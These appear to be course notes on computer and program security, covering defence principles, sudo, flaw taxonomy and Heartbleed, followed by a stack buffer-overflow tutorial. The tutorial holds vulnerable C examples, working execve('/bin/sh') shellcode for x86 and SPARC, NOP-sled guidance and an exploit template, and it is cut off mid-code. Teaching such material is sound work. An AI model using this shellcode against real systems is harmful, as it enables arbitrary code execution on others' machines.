+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Prevent it</li>
+<li>Deter it</li>
+<li>Deflect it: make yourself less attractive to attacker (Xbox)</li>
+<li>Detect it</li>
+<li>Recover from it</li>
+<li>Defence in depth</li>
+<li>Your car may get stolen
+<ul>
+<li>Park inside your garage</li>
+<li>Lock your car</li>
+<li>Insurance</li>
+</ul>
+</li>
+</ul>
+<h3 id="weakest-link" >Weakest Link
+<span>
+    <a href="#weakest-link">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>A system is only as strong as its weakest link</li>
+</ul>
+<h3 id="defence-of-computer-systems" >Defence of Computer Systems
+<span>
+    <a href="#defence-of-computer-systems">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Cryptography
+<ul>
+<li>Digital signatures</li>
+<li>Cryptographic protocols</li>
+<li>Unreadable to an attacker</li>
+</ul>
+</li>
+<li>Software Controls
+<ul>
+<li>Passwords</li>
+<li>Separate user actions from each other</li>
+<li>Virus scanner</li>
+<li>Development controls</li>
+<li>Firewalls</li>
+</ul>
+</li>
+<li>Hardware Controls
+<ul>
+<li>Fingerprint</li>
+<li>Smart tokens</li>
+<li>Trusted Execution Environments (TEEs)</li>
+</ul>
+</li>
+<li>Physical Controls
+<ul>
+<li>Locks</li>
+<li>Guards</li>
+<li>Off-site backups</li>
+</ul>
+</li>
+<li>Policies and Procedures
+<ul>
+<li>Non-technical means can be used to protect against some classes of attack</li>
+<li>Rules about choosing passwords</li>
+<li>Training in best security practices</li>
+<li>VPN</li>
+</ul>
+</li>
+</ul>
+<h2 id="program-security" >Program Security
+<span>
+    <a href="#program-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="linux-security-basics" >Linux Security Basics
+<span>
+    <a href="#linux-security-basics">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>What is the root user, and what is sudo, and how does it work?</p>
+<p>The root user, is the super-user with user ID 0 on a Linux system which implies they have full uncapped control over the entire system and are allowed to do anything they want.</p>
+<p>Therefore, certain programs restrict actions to the root user as they are basically saying &ldquo;we are doing or want to access something critical, therefore the root user needs to run this program.&rdquo; This is there to protect the system from non-root users and programs.</p>
+<p>So to run programs that require the user to be root, either we log in as the root user and run every program by default with privilege or we use the <code>sudo</code> (superuser do) program to run other programs as the root user. The sudo program is a program with root access (well one specific one which is the ability to set a program&rsquo;s userID) that lets us run programs as any other user, however the default behaviour is to try running as the root user.</p>
+<p>Now how does sudo actually figure out if the non-root user can run programs as root? Security policy. It first checks if the command is allowed to be run by root by the user via the patterns in the <code>/etc/sudoers</code> file. This means that sudo will not ask for the password. Anyways, the sudo program will do all those pattern checks and then will try to see if you are part of the sudo group. The sudo group is a group that can use the sudo command arbitrarily.</p>
+<p>Want to know if you are part of the sudo group?</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>groups <span style="color:#40ffff">$USER</span> | grep -q sudo &amp;&amp; <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;you are sudo&#34;</span> ||  <span style="color:#24909d">echo</span> you are not sudo
+</span></span></code></pre></div><h3 id="flaw-faults-and-failures" >Flaw, faults, and failures
+<span>
+    <a href="#flaw-faults-and-failures">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Flaw is a problem with a program</li>
+<li>Security flaw is a flaw that affects security in some way (confidentiality, integrity, availability)</li>
+<li>Flaws are faults or failures
+<ul>
+<li>A fault is a potential problem and behind the scenes</li>
+<li>Once exploited, it becomes a failure</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-and-fixing-faults" >Finding and Fixing Faults
+<span>
+    <a href="#finding-and-fixing-faults">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Fuzzing:
+<ul>
+<li>Test with random input</li>
+</ul>
+</li>
+<li>Think like an attacker</li>
+<li>Can work backwards if user reported a failure</li>
+<li>Make patches to the program</li>
+<li>Penetrate and patch</li>
+<li>MIcrosoft&rsquo;s &ldquo;Patch Tuesday&rdquo;</li>
+<li>Zero day: problem not known to the vendor</li>
+</ul>
+<p>Problems with patching</p>
+<ul>
+<li>HIgh pressure to fix the fault results in narrow focus instead of broad underlying problem</li>
+<li>Fault caused other, unnoticed failures, and a partial fix</li>
+<li>Patch causes new faults, here or elsewhere</li>
+</ul>
+<p>Alternatives?</p>
+<ul>
+<li>Test based updating
+<ul>
+<li>Create a test for the security vulnerability and then fix code so that tests pass</li>
+</ul>
+</li>
+</ul>
+<h3 id="unexpected-behaviour" >Unexpected Behaviour
+<span>
+    <a href="#unexpected-behaviour">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Program has a spec for what the program must do</li>
+<li>From security POV, extra behaviours could be bad</li>
+<li>Always consider &ldquo;and nothing else&rdquo;</li>
+<li>How to test Should do vs. Should not do</li>
+</ul>
+<h3 id="types-of-security-flaws" >Types of security flaws
+<span>
+    <a href="#types-of-security-flaws">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Genesis method
+<ul>
+<li>Intentional
+<ul>
+<li>Malicious</li>
+<li>Non-malicious
+<ul>
+<li>A backdoor or a bad security that was supposed to be removed</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Unintentional</li>
+</ul>
+</li>
+</ul>
+<p>Most security flaws are unintentional program errors</p>
+<h3 id="unintentional-security-flaws" >Unintentional Security Flaws
+<span>
+    <a href="#unintentional-security-flaws">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Heartbleed Bug in OpenSSL (April 2014)</li>
+<li>TLS Heartbeat mechanism was designed to keep SSL/TLS connections alive even when no data is being transmitted</li>
+<li>Random data and a payload length</li>
+<li>Other peer supposed to respond with a mirror of exactly the same data</li>
+<li>Missing bounds check in the code</li>
+<li>Attacker can request 64KB of memory space from the same area that holds server&rsquo;s private key</li>
+</ul>
+<p><img src="https://imgs.xkcd.com/comics/heartbleed_explanation_2x.png" alt="Comic"></p>
+<p>Types:</p>
+<ul>
+<li>Buffer overflows</li>
+<li>Integer overflows</li>
+<li>Incomplete mediation</li>
+<li>Format string vulnerabilities</li>
+<li>TOCTTOU errors (Time-of-check to time-of-use)</li>
+</ul>
+<h3 id="buffer-overflows" >Buffer Overflows
+<span>
+    <a href="#buffer-overflows">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Most commonly exploited type of security flaw</li>
+<li>Program code (Text)</li>
+<li>Global data (BSS and data segments)</li>
+<li>Heap (dynamically allocated data)</li>
+<li>Function call data (Stack)
+<ul>
+<li>The stack increases (lower memory addresses) as functions are called (frames)</li>
+<li>x86 architecture</li>
+</ul>
+</li>
+<li>Important addresses: Return Address and Frame Pointer</li>
+<li>Example</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#defined LINELEN 1024
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#6ab825;font-weight:bold">char</span> buffer[LINELEN];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#447fcf">gets</span>(buffer);
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// OR
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#447fcf">strcpy</span>(buffer, arv[<span style="color:#3677a9">1</span>]);
+</span></span></code></pre></div><p>What happens when the buffer length &lt; than the first argument?</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">check_signature</span>(<span style="color:#6ab825;font-weight:bold">char</span> *str, <span style="color:#6ab825;font-weight:bold">int</span> j) {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">char</span> user_signature[<span style="color:#3677a9">24</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">strcpy</span>(user_signature, str);
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#447fcf">isValid</span>(user_signature));
+</span></span><span style="display:flex;"><span>    i = <span style="color:#3677a9">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> i;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#999;font-style:italic">// main FRAME
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>...
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// check_signature FRAME
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>j
+</span></span><span style="display:flex;"><span>&amp;str                                                          FP + <span style="color:#3677a9">8</span>
+</span></span><span style="display:flex;"><span>Return <span style="color:#447fcf">Address</span> (RA)
+</span></span><span style="display:flex;"><span>Old Frame <span style="color:#447fcf">Pointer</span> (FP)                           &amp;larr;--- FRAME POINTER HERE
+</span></span><span style="display:flex;"><span>............
+</span></span><span style="display:flex;"><span>Padding
+</span></span><span style="display:flex;"><span>............
+</span></span><span style="display:flex;"><span>Value of i
+</span></span><span style="display:flex;"><span>user_signature[<span style="color:#3677a9">23</span>]
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>user_signature[<span style="color:#3677a9">0</span>]
+</span></span></code></pre></div><p>When a function call returns, the OLD FP and local variables of its stack are popped but the args and RA are kept since it&rsquo;s part of its parent&rsquo;s local variables.</p>
+<p>Str = &ldquo;randomStringLongerThan24Bytes&rdquo;</p>
+<p>We can use <code>\xbf...</code> to overwrite the return addresses such that the function and program returns to another part. We can also set that <code>i = 1</code> through.</p>
+<ul>
+<li>Crash reasons
+<ul>
+<li>overwritten RA to an invalid address</li>
+<li>unmapped virtual address</li>
+<li>valid address does not point to an instruction
+<ul>
+<li>Question: by is not an instruction, is that a raw data does not correspond to an instruction, or is it in the wrong part of the code?</li>
+</ul>
+</li>
+<li>address content is off-limit</li>
+</ul>
+</li>
+</ul>
+<details><summary>Smash the Stack</summary>
+<p>How did we know to add 8 to the return address?  We used a
+test value first (for example 1), compiled the program, and then started gdb:</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">gdb example3
+(gdb) disassemble main
+</code></pre><p>0x8004b2 - 0x8004a8 = 8</p>
+<ul>
+<li>We want to spawn a shell and run arbitrary command</li>
+<li>We want to overwrite the buffer with code we want to run</li>
+<li>We want to set the return address to the address of the code we want to run</li>
+<li>Write code in hack.c, compile, and use gdb to get the code commands</li>
+<li>(gdb) disassemble main</li>
+<li>(gdb) disassemble __execve</li>
+</ul>
+<p>Template</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>   <span style="color:#6ab825;font-weight:bold">char</span> *name[<span style="color:#3677a9">2</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   name[<span style="color:#3677a9">0</span>] = <span style="color:#ed9d13">&#34;/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>   name[<span style="color:#3677a9">1</span>] = <span style="color:#24909d">NULL</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#447fcf">execve</span>(name[<span style="color:#3677a9">0</span>], name, <span style="color:#24909d">NULL</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol>
+<li>Have the null terminated string &ldquo;/bin/sh&rdquo; somewhere in memory.</li>
+<li>Have the address of the string &ldquo;/bin/sh&rdquo; somewhere in memory followed by a null long word.</li>
+<li>Copy 0xb into the EAX register.</li>
+<li>Copy the address of the address of the string &ldquo;/bin/sh&rdquo; into the EBX register.</li>
+<li>Copy the address of the string &ldquo;/bin/sh&rdquo; into the ECX register.</li>
+<li>Copy the address of the null long word into the EDX register.</li>
+<li>Execute the int $0x80 instruction.</li>
+<li>Copy 0x1 into the EAX register.</li>
+<li>Copy 0x0 into the EBX register.</li>
+<li>Execute the int $0x80 instruction.</li>
+</ol>
+<p>We also want to add an exit(0) call to make sure things are fine</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">exit</span>(<span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>want to make sure to not have null bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> shellcode[] =
+</span></span><span style="display:flex;"><span>        <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x80\xe8\xdc\xff\xff\xff</span><span style="color:#ed9d13">/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> large_string[<span style="color:#3677a9">128</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">96</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> i;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">long</span> *long_ptr = (<span style="color:#6ab825;font-weight:bold">long</span> *) large_string;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &lt; <span style="color:#3677a9">32</span>; i++)
+</span></span><span style="display:flex;"><span>    *(long_ptr + i) = (<span style="color:#6ab825;font-weight:bold">int</span>) buffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &lt; <span style="color:#447fcf">strlen</span>(shellcode); i++)
+</span></span><span style="display:flex;"><span>    large_string[i] = shellcode[i];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">strcpy</span>(buffer,large_string);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code class="language-gdb" data-lang="gdb">(gdb) disassemble main
+...End of assembler dump.
+(gdb) x/bx main+3
+0x8000133 &lt;main+3&gt;:     0xeb
+</code></pre><p>Test your exploit. We also need to replace null bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> shellcode[] =
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>   <span style="color:#6ab825;font-weight:bold">int</span> *ret;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ret = (<span style="color:#6ab825;font-weight:bold">int</span> *)&amp;ret + <span style="color:#3677a9">2</span>;
+</span></span><span style="display:flex;"><span>   (*ret) = (<span style="color:#6ab825;font-weight:bold">int</span>)shellcode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Problem instruction:                 Substitute with:
+</span></span><span style="display:flex;"><span>--------------------------------------------------------
+</span></span><span style="display:flex;"><span>movb   $0x0,0x7(%esi)                xorl   %eax,%eax
+</span></span><span style="display:flex;"><span>molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
+</span></span><span style="display:flex;"><span>                                    movl   %eax,0xc(%esi)
+</span></span><span style="display:flex;"><span>--------------------------------------------------------
+</span></span><span style="display:flex;"><span>movl   $0xb,%eax                     movb   $0xb,%al
+</span></span><span style="display:flex;"><span>--------------------------------------------------------
+</span></span><span style="display:flex;"><span>movl   $0x1, %eax                    xorl   %ebx,%ebx
+</span></span><span style="display:flex;"><span>movl   $0x0, %ebx                    movl   %ebx,%eax
+</span></span><span style="display:flex;"><span>                                    inc    %eax
+</span></span></code></pre></div><p>How to print the stack pointer</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">get_sp</span>(<span style="color:#6ab825;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>   <span style="color:#447fcf">__asm__</span>(<span style="color:#ed9d13">&#34;movl %esp,%eax&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;0x%x</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#447fcf">get_sp</span>());
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Since we don&rsquo;t know where our code starts, we want to use a bunch of NOP (0x90), then put our code, then put the return addresses.</p>
+<p>We can also use Environment variables, in case the buffer is small.</p>
+<p>What to look for?</p>
+<blockquote>
+<p>They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string.  gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF.  It performs no checks for buffer overflows.  The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width.  If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow.</p>
+</blockquote>
+<blockquote>
+<p>Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached.  This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#999;font-style:italic">// shellcode.c
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#cd2828;font-weight:bold">#if defined(__i386__) &amp;&amp; defined(__linux__)
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define NOP_SIZE	1
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#6ab825;font-weight:bold">char</span> nop[] = <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x90</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> shellcode[] =
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x80\xe8\xdc\xff\xff\xff</span><span style="color:#ed9d13">/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">get_sp</span>(<span style="color:#6ab825;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>   <span style="color:#447fcf">__asm__</span>(<span style="color:#ed9d13">&#34;movl %esp,%eax&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define NOP_SIZE	4
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#6ab825;font-weight:bold">char</span> nop[]=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xac\x15\xa1\x6e</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> shellcode[] =
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e</span><span style="color:#ed9d13">&#34;</span>
